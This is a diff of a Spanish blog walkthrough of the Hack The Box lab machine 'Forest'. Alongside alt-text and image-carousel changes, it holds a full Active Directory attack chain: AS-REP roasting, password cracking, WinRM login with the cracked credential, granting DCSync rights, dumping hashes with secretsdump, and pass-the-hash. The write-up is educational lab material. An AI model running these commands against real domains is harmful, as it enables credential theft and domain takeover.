@@ -79,7 +79,7 @@
   </time>
   <p>El día de hoy vamos a resolver la máquina <em>Forest</em> de <em>Hack The Box</em>. Es una máquina <em>Windows</em> de nivel de dificultad medio en la intrusión, y medio en la escalada de privilegios según figura en la plataforma.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/1.png" alt="User Rated Difficulty" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>
 
@@ -88,7 +88,7 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.161
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/2.png" alt="2" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">127</code>, por lo que podemos intuir que estamos ante una máquina <em>Windows</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>
 
@@ -120,7 +120,7 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.161 -R
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3a.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/3a.png" alt="3" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>
 
@@ -220,12 +220,12 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbmap <span class="nt">-H</span> 10.10.10.161
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/4.png" alt="4" class="blog-image" onclick="expandImage(this)" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">-N</span> <span class="nt">-L</span> 10.10.10.161
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/5.png" alt="5" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Lo siguiente que podemos probar es enumerar el protocolo <code class="language-plaintext highlighter-rouge">LDAP</code> para obtener información sobre usuarios, grupos u otros objetos en el entorno. Para realizar esto, utilizaremos la herramienta <code class="language-plaintext highlighter-rouge">ldapsearch</code>.</p>
 
@@ -234,7 +234,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.161 <span class="nt">-s</span> base namingcontexts
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/6.png" alt="6" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>El campo <em>dn</em> se encuentra vacío porque estamos consultando el objeto base del directorio. Los campos <em>namingContexts</em> listan los diferentes <em>Naming Contexts</em> del servidor <em>LDAP</em>. Cada entrada en <em>namingContexts</em> representa una parte distinta del directorio <em>LDAP</em> que puede ser la base de varias búsquedas.</p>
 
@@ -277,7 +277,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.10.161 <span class="nt">-b</span> <span class="s2">"dc=htb,dc=local"</span> <span class="s1">'(objectClass=user)'</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/7.png" alt="7" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>En los campos <em>sAMAccountName</em> de cada usuario, encontraremos sus respectivos nombres de usuario. Con un listado potencial de usuarios en nuestro poder, podríamos considerar un ataque <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>.</p>
 
@@ -285,42 +285,42 @@
 
 <p>Con esto en mente, en vez de buscar usuario por usuario manualmente, podemos utilizar un one-liner para filtrar y parsear los usuarios directamente.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/8.png" alt="8" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Podemos refinar aún más la lista de usuarios obtenida para centrarnos exclusivamente en las cuentas relevantes. Las dos primeras cuentas, <em>DefaultAccount</em> y <em>Guest</em>, son creadas por el propio <em>AD</em> (aunque <em>Guest</em> no está habilitada por defecto). Las cuentas que terminan en <em>$</em> son cuentas de equipos (<em>computer accounts</em>), mientras que la cuenta <em>$331000-VK4ADACQNUCA</em> tiene un formato inusual y podría ser una cuenta de servicio especial o generada automáticamente. Las cuentas que empiezan por <em>SM_</em> y <em>HealthMailbox</em> están relacionadas con el servicio <em>Microsoft Exchange</em>. Esto nos deja con cinco usuarios potenciales para nuestro análisis.</p>
 
 <p>Lo siguiente que haremos será utilizar el script <code class="language-plaintext highlighter-rouge">GetNPUsers</code> de la suite <code class="language-plaintext highlighter-rouge">Impacket</code>. Para ejecutarlo, necesitamos proporcionar el nombre del dominio del <em>AD</em> al que queremos apuntar. Para configurar esto, editaremos el archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> para asegurarnos de que el nombre de dominio se resuelva a la dirección IP correspondiente del servidor.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/9.png" alt="9" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Con esto hecho, el comando que utilizaremos es el siguiente:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-GetNPUsers htb.local/ <span class="nt">-no-pass</span> <span class="nt">-userfile</span> archivoListadoUsuarios 
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/10.png" alt="10" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Curiosamente, ninguno de los usuarios que hemos obtenido parece ser vulnerable a <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>. Por lo tanto, procederemos a enumerar otro protocolo que hemos identificado durante nuestro escaneo con <em>Nmap</em>, <code class="language-plaintext highlighter-rouge">RPC</code>.</p>
 
 <p>Haremos uso de <code class="language-plaintext highlighter-rouge">rpcclient</code>, nuevamente utilizando un <em>null session</em>, pues no contamos con credenciales. Verificamos que podemos conectarnos exitosamente, por lo que procederemos a enumerar información adicional. Podríamos listar los grupos dentro del dominio mediante <em>enumdomgroup</em> o, alternativamente, volver a listar los usuarios del dominio mediante <em>enumdomusers</em>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Podemos observar tres nuevos usuarios que no habíamos detectado cuando enumeramos con <em>ldapsearch</em>. De los cuales nos interesa <code class="language-plaintext highlighter-rouge">svc-alfresco</code>, pues tanto Administrator como krbtgt son creados por el propio <em>AD</em>.</p>
 
 <p>Si recordamos, cuando utilizamos <em>ldapsearch</em>, filtramos usuarios cuya clase de objeto contenga <em>user</em>, y los cinco usuarios que encontramos anteriormente, cumplen con esta condición.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/12.png" alt="12" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Sin embargo, al investigar un poco más, descubrimos que este “usuario” <code class="language-plaintext highlighter-rouge">svc-alfresco</code> no tiene una clase de objeto definida. Esto probablemente se debe a que pertenece a la <em>Unidad Organizativa (OU)</em> de Cuentas de Servicio (Service Accounts).</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/13.png" alt="13" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Nuevamente, mediante el uso de un one-liner podríamos filtrar y parsear los usuarios, refinar la lista y utilizarla junto a <code class="language-plaintext highlighter-rouge">Impacket</code> para comprobar si este nuevo usuario es vulnerable a <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/14.png" alt="14" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Descubrimos que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es vulnerable a <code class="language-plaintext highlighter-rouge">AS-REP Roasting</code> y obtenemos un hash que procederemos a intentar romper por fuerza bruta utilizando <code class="language-plaintext highlighter-rouge">John the Ripper</code> en conjunto con el diccionario <a href="https://github.com/brannondorsey/naive-hashcat/releases/tag/data">rockyou.txt</a>.</p>
 
@@ -332,7 +332,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john <span class="nt">--wordlist</span><span class="o">=</span>/ruta/del/diccionario/rockyou.txt <span class="nb">hash</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/16.png" alt="16" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez obtenemos la contraseña del usuario <code class="language-plaintext highlighter-rouge">svc-alfresco</code>, podemos validar la credencial antes de intentar conectarnos a la máquina víctima para asegurarnos de que es correcta. Recordemos que durante nuestro escaneo con <em>Nmap</em>, observamos que el servicio <code class="language-plaintext highlighter-rouge">WinRM</code> (<em>Windows Remote Management</em>) está activo en la máquina víctima; este será el protocolo que utilizaremos para la conexión.</p>
 
@@ -341,7 +341,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crackmapexec winrm 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Nos damos cuenta de que la credencial no solo es válida, sino también que este usuario pertenece al grupo <em>Remote Management Users</em>, ya que vemos junto al nombre de usuario un mensaje que dice <em>Pwn3d!</em>. Por lo tanto, podemos conectarnos a la máquina víctima mediante <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>.</p>
 
@@ -350,7 +350,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'svc-alfresco'</span> <span class="nt">-p</span> <span class="s1">'s3rvice'</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
 
 <h3 id="escalada-de-privilegios"><a href="#header-3"></a>Escalada De Privilegios</h3>
 
@@ -372,7 +372,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>download &lt;timestamp&gt;_BloodHound.zip BloodHound.zip
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Lo siguiente que haremos será importar el archivo comprimido que generó <code class="language-plaintext highlighter-rouge">SharpHound</code> a <code class="language-plaintext highlighter-rouge">BloodHound</code>. Para ello, en caso de no contar con la herramienta instalada, podemos hacer lo siguiente:</p>
 
@@ -384,7 +384,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>neo4j console
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/20.png" alt="20" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Nos indicará que nos dirijamos a <a href="http://localhost:7474/">http://localhost:7474/</a>. Para conectarnos a <em>Neo4j</em> por primera vez, las credenciales que introduciremos son las que vienen por defecto:</p>
 
@@ -393,23 +393,23 @@
   <li>Password: neo4j</li>
 </ul>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/21.png" alt="21" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>A continuación, nos solicitará que cambiemos la contraseña; esta será la que utilizaremos para <code class="language-plaintext highlighter-rouge">BloodHound</code>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/22.png" alt="22" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez abramos <code class="language-plaintext highlighter-rouge">BloodHound</code> y nos logueemos, en la parte derecha veremos una sección que dice <em>Upload Data</em>. Aquí es donde subiremos nuestro archivo comprimido.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/23.png" alt="23" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>En la barra de búsqueda en la parte superior izquierda, podemos buscar por el usuario que acabamos de comprometer, <code class="language-plaintext highlighter-rouge">svc-alfresco</code>. Podemos hacer clic derecho sobre él y seleccionar <em>Mark User as Owned</em>.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/24.png" alt="24" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Si nos dirigimos al apartado <em>Analysis</em>, encontraremos una sección <em>Shortest Paths</em>. Dentro de esta sección, seleccionamos <em>Shortest Path from Owned Principals</em>. Al hacer clic, se desplegará un gráfico que ilustra el mejor camino para convertirnos en administrador del sistema.</p>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/25.png" alt="25" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Podemos observar que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> es miembro del grupo <em>Service Accounts</em>, el cual es miembro del grupo <em>Privileged IT Accounts</em>, que a su vez es miembro del grupo <em>Account Operators</em>. Además, el grupo <em>Account Operators</em> tiene permisos <em>GenericAll</em> sobre el grupo <em>Exchange Windows Permissions</em>, lo que le da control total sobre este grupo. El grupo <em>Exchange Windows Permissions</em> tiene permisos <em>WriteDacl</em> sobre el dominio, lo que permite modificar la lista de control de acceso discrecional (<em>DACL</em>) del dominio.</p>
 
@@ -422,7 +422,7 @@
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user nombreDeUsuario contraseña /add /domain
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/26.png" alt="26" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Lo siguiente que haremos será añadir el usuario que acabamos de crear al grupo <em>Exchange Windows Permissions</em>, aprovechando que <code class="language-plaintext highlighter-rouge">svc-alfresco</code> tiene control total sobre este grupo:</p>
 
@@ -434,7 +434,7 @@
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-ADGroupMember</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"Remote Management Users"</span><span class="w"> </span><span class="nt">-Members</span><span class="w"> </span><span class="s2">"nombreDeUsuario"</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/27.png" alt="27" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Al añadir al usuario al grupo <em>Remote Management Users</em>, evitamos el uso de <em>PSCredentials</em>, que normalmente se utilizan para ejecutar comandos con las credenciales de otro usuario, las cuales, personalmente, me generaban conflictos con <code class="language-plaintext highlighter-rouge">PowerView</code>.</p>
 
@@ -444,67 +444,128 @@
 </span><span class="n">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
 </span></code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/28.png" alt="28" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Una vez importado, utilizaremos la función <code class="language-plaintext highlighter-rouge">Add-DomainObjectAcl</code> para otorgar permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> a nuestro usuario recién creado:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-DomainObjectAcl <span class="nt">-TargetIdentity</span> <span class="s2">"DC=htb,DC=local"</span> <span class="nt">-PrincipalIdentity</span> nombreDeUsuario <span class="nt">-Rights</span> DCSync
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/29.png" alt="29" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Ya con permisos de <code class="language-plaintext highlighter-rouge">DCsync</code> en nuestro usuario, podemos utilizar <code class="language-plaintext highlighter-rouge">secretsdump</code>, otro script de la suite <code class="language-plaintext highlighter-rouge">Impacket</code> que nos permitirá dumpear los hashes de todos los usuarios del dominio:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-secretsdump htb.local/nombreDeUsuario:contraseña@10.10.10.161
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/30.png" alt="30" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Finalmente, podemos realizar un ataque de tipo <code class="language-plaintext highlighter-rouge">Pass the Hash</code>, que consiste en usar el <em>hash</em> que acabamos de conseguir en lugar de la contraseña (que no conocemos) para autenticarnos. Para esto, podríamos utilizar <code class="language-plaintext highlighter-rouge">psexec</code> (otro script de <code class="language-plaintext highlighter-rouge">Impacket</code>), o bien, mediante el mismo <code class="language-plaintext highlighter-rouge">Evil-WinRM</code>:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.10.161 <span class="nt">-u</span> <span class="s1">'Administrator'</span> <span class="nt">-H</span> <span class="s1">'HASH'</span>
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/31.png" alt="31" class="blog-image" onclick="expandImage(this)" /></p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>impacket-psexec administrator@10.10.10.161 <span class="nt">-hash</span> HASH
 </code></pre></div></div>
 
-<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png" alt="" class="blog-image" onclick="expandImage(this)" /></p>
+<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-08-19-Forest-Hack-The-Box/32.png" alt="32" class="blog-image" onclick="expandImage(this)" /></p>
 
 </article>
+
+<div id="carousel" class="carousel">
+  <img id="carouselImage" class="carousel-image">
+  <div id="carouselAlt" class="carousel-alt"></div>
+  <button class="carousel-control prev" onclick="prevImage()">&#10094;</button>
+  <button class="carousel-control next" onclick="nextImage()">&#10095;</button>
+</div>
 
 <div class="image-overlay" onclick="closeImage()"></div>
 <img id="expandedImage" class="expanded-image">
 
 <script>
-function expandImage(img) {
-  var expandedImg = document.getElementById("expandedImage");
-  var overlay = document.querySelector(".image-overlay");
+  document.addEventListener('DOMContentLoaded', function() {
+    var tocList = document.getElementById('toc-list');
+    var headers = document.querySelectorAll('article h3');
 
-  expandedImg.src = img.src;
+    headers.forEach(function(header, index) {
+      var id = 'section-' + index;
+      header.id = id;
 
-  overlay.style.display = "block";
-  expandedImg.style.display = "block";
+      var listItem = document.createElement('li');
+      var link = document.createElement('a');
+      link.href = '#' + id;
+      link.textContent = header.textContent;
+      listItem.appendChild(link);
+      tocList.appendChild(listItem);
+    });
+  });
 
-  document.addEventListener("keydown", handleEscKey);
-}
+  var currentImageIndex = 0;
+  var images = [];
+  var altTexts = [];
 
-function closeImage() {
-  var expandedImg = document.getElementById("expandedImage");
-  var overlay = document.querySelector(".image-overlay");
+  document.querySelectorAll('.blog-image').forEach((img, index) => {
+    images.push(img.src);
+    altTexts.push(img.alt || '');
+    img.setAttribute('data-index', index);
+    img.onclick = () => expandImage(img);
+  });
 
-  overlay.style.display = "none";
-  expandedImg.style.display = "none";
+  function expandImage(img) {
+    currentImageIndex = parseInt(img.getAttribute('data-index'));
+    showImage(currentImageIndex);
+    document.getElementById('carousel').style.display = 'block';
+    document.querySelector('.image-overlay').style.display = 'block';
+    document.body.style.overflow = 'hidden';
 
-  document.removeEventListener("keydown", handleEscKey);
-}
+    document.addEventListener('keydown', handleKeyPress);
 
-function handleEscKey(event) {
-  if (event.key === "Escape" || event.key === "Esc") {
-    closeImage();
+    document.querySelectorAll('.carousel-control').forEach(control => {
+      control.style.display = 'block';
+    });
   }
-}
+
+  function showImage(index) {
+    var carouselImg = document.getElementById('carouselImage');
+    carouselImg.src = images[index];
+    
+    var carouselAlt = document.getElementById('carouselAlt');
+    carouselAlt.textContent = altTexts[index];
+  }
+
+  function closeImage() {
+    document.getElementById('carousel').style.display = 'none';
+    document.querySelector('.image-overlay').style.display = 'none';
+    document.body.style.overflow = 'auto';
+
+    document.removeEventListener('keydown', handleKeyPress);
+
+    document.querySelectorAll('.carousel-control').forEach(control => {
+      control.style.display = 'none';
+    });
+  }
+
+  function prevImage() {
+    currentImageIndex = (currentImageIndex - 1 + images.length) % images.length;
+    showImage(currentImageIndex);
+  }
+
+  function nextImage() {
+    currentImageIndex = (currentImageIndex + 1) % images.length;
+    showImage(currentImageIndex);
+  }
+
+  function handleKeyPress(event) {
+    if (event.key === 'Escape') {
+      closeImage();
+    } else if (event.key === 'ArrowLeft') {
+      prevImage();
+    } else if (event.key === 'ArrowRight') {
+      nextImage();
+    }
+  }
 </script>
 
       </section>
